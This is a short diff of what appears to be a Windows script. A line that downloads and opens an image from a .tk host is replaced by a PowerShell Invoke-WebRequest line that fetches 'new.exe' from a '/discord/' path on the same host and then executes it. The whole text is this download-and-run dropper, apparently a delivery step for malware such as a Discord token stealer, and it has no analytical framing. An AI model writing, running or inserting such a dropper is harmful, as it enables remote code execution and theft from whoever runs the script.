@@ -1,2 +1,2 @@
-Powershell -Command "Invoke-WebRequest -Uri 'http://anontoken1.tk/mygirlfriend.jpg' -OutFile mygirlfriend.jpg"
-mygirlfriend.jpg
+Powershell -Command "Invoke-WebRequest -Uri 'http://anontoken1.tk/discord/new.exe' -OutFile new.exe"
+new.exe
